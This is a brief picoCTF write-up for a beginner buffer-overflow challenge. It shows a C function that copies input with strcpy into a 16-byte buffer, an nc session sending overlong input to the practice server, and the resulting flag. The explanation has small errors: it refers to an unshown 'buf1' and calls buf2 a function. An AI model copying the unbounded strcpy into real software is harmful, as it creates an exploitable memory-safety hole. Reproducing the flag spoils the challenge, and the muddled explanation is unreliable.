# Buffer Overlow 0

## Description



## Solution
In this program we are asked to overflow the buffer. In the source code provided there is the following function

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

In this program we are asked to overflow the buffer. In the source code provided there is the following function. This means that the input entered by the user will go into buf1, then inserted into buf2. 

The buf2 function (strcpy) does not limit the length of the copied data, so if the user enters more than 16 characters, the buffer overflow occurs.

```
$ nc saturn.picoctf.net 56567
Input: 111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
